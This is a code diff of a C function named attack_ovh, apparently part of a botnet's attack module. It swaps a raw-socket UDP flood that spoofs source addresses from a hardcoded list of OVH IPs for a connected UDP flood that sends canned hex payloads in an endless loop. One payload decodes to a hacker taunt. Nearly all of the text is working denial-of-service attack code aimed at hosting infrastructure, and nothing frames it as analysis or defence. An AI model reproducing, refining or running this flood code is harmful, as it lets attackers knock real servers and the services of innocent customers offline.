@@ -53,124 +53,74 @@ static unsigned long int ovh_rand(void)
 
 void attack_ovh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-    int i, fd;
+    int i;
+    int *fds = calloc(targs_len, sizeof(int));
     char **pkts = calloc(targs_len, sizeof(char *));
-    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
-    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
-    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
-    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
     port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
     port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
-    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
+    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);
     BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
-    int pps_limiter = attack_get_opt_int(opts_len, opts, ATK_OPT_PPS, 0);
-
-    // Large pool of OVH source IPs for spoofing (already in network byte order)
-    uint32_t ovh_ips[] = {
-        2372231209, 2728286747, 1572769288, 3339925505, 2372233279, 3254787125,
-        1160024353, 2328478311, 3266388596, 3238005002, 1745910789, 3455829265,
-        1822614803, 3355015169, 3389792053, 757144879, 2734605396, 1230980369,
-        3639549962, 2728310654, 3256452616, 3561573700, 2918529833, 2890221130,
-        2918997764, 2453837834, 3369835018, 3256452681, 3007103780, 1137178634,
-        3264375402, 3229415686, 2728310653, 3627732067, 2890220626, 1137178635,
-        3391077889, 1745910533, 1755074592, 16843009, 1092011777, 3223532318,
-        2918529914, 621985916, 2728287341, 1191626519, 2890184316, 1822618132,
-        2372231209, 2728286747, 1572769288, 3339925505, 2372233279, 3254787125,
-        1160024353, 2328478311, 3266388596, 3238005002, 1745910789, 3455829265,
-        1822614803, 3355015169, 3389792053, 757144879, 2734605396, 1230980369
-    };
-    int num_ovh_ips = sizeof(ovh_ips) / sizeof(ovh_ips[0]);
 
     if (data_len > 1460)
         data_len = 1460;
 
-    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
-    {
-#ifdef DEBUG
-        printf("Failed to create raw socket. Aborting attack\n");
-#endif
-        return;
-    }
-    i = 1;
-    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
-    {
-#ifdef DEBUG
-        printf("Failed to set IP_HDRINCL. Aborting\n");
-#endif
-        close(fd);
-        return;
-    }
-
-    ovh_srand(time(NULL));
+    // OVH-specific hex payloads
+    char *hex_payloads[] = {
+        "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff",
+        "\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29\xe2\x9e\xba\x28\xa1\xc2\xb0\x20\x20\x9c\xca\x96\x20\xcd\xa1\xc2\xb0\x29",
+        "\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf",
+        "\x53\x65\x6c\x66\x20\x52\x65\x70\x20\x46\x75\x63\x6b\x69\x6e\x67\x20\x4e\x65\x54\x69\x53\x20\x61\x6e\x64\x20\x54\x68\x69\x73\x69\x74\x79\x20\x30\x6e\x20\x55\x72\x20\x46\x75\x43\x6b\x49\x6e\x47\x20\x46\x6f\x72\x65\x48\x65\x41\x64\x20\x57\x65\x20\x42\x69\x47\x20\x4c\x33\x33\x54\x20\x48\x61\x78\x45\x72\x53\x0a"
+    };
+    int num_payloads = sizeof(hex_payloads) / sizeof(hex_payloads[0]);
 
     for (i = 0; i < targs_len; i++)
     {
-        struct iphdr *iph;
-        struct udphdr *udph;
+        struct sockaddr_in bind_addr = {0};
 
-        pkts[i] = calloc(1510, sizeof(char));
-        iph = (struct iphdr *)pkts[i];
-        udph = (struct udphdr *)(iph + 1);
+        if (dport == 0xffff)
+            targs[i].sock_addr.sin_port = rand_next();
+        else
+            targs[i].sock_addr.sin_port = htons(dport);
 
-        iph->version = 4;
-        iph->ihl = 5;
-        iph->tos = ip_tos;
-        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
-        iph->id = htons(ip_ident);
-        iph->ttl = ip_ttl;
-        if (dont_frag)
-            iph->frag_off = htons(1 << 14);
-        iph->protocol = IPPROTO_UDP;
-        iph->saddr = ovh_ips[ovh_rand() % num_ovh_ips];
-        iph->daddr = targs[i].addr;
+        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
+        {
+#ifdef DEBUG
+            printf("Failed to create socket\n");
+#endif
+            return;
+        }
 
-        udph->source = htons(sport);
-        udph->dest = htons(dport);
-        udph->len = htons(sizeof(struct udphdr) + data_len);
+        bind_addr.sin_family = AF_INET;
+        if (sport == 0xffff)
+            bind_addr.sin_port = rand_next();
+        else
+            bind_addr.sin_port = htons(sport);
+        bind_addr.sin_addr.s_addr = 0;
+
+        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));
+
+        if (targs[i].netmask < 32)
+            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
+
+        connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
     }
 
-    int sent = 0;
+    unsigned int a = 0;
+    char *hexstring = malloc(1460);
+    memset(hexstring, 0, 1460);
 
     while (TRUE)
     {
-        for (i = 0; i < targs_len; i++)
+        if (a >= 50)
         {
-            char *pkt = pkts[i];
-            struct iphdr *iph = (struct iphdr *)pkt;
-            struct udphdr *udph = (struct udphdr *)(iph + 1);
+            util_memcpy(hexstring, hex_payloads[rand_next() % num_payloads], data_len);
 
-            // Randomize source IP from OVH pool on each packet
-            iph->saddr = ovh_ips[ovh_rand() % num_ovh_ips];
-
-            if (targs[i].netmask < 32)
-                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
-
-            if (ip_ident == 0xffff)
-                iph->id = (uint16_t)rand_next();
-            if (sport == 0xffff)
-                udph->source = rand_next();
-            if (dport == 0xffff)
-                udph->dest = rand_next();
-
-            // Randomize payload
-            if (data_rand)
-                rand_str((char *)(udph + 1), data_len);
-
-            iph->check = 0;
-            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
-
-            udph->check = 0;
-            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + data_len);
-
-            targs[i].sock_addr.sin_port = udph->dest;
-            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
-
-            sent++;
-            if (pps_limiter > 0 && sent >= pps_limiter)
+            for (i = 0; i < targs_len; i++)
             {
-                sent = 0;
-                usleep(1000);
+                send(fds[i], hexstring, data_len, MSG_NOSIGNAL);
             }
+            a = 0;
         }
+        a++;
     }
 }
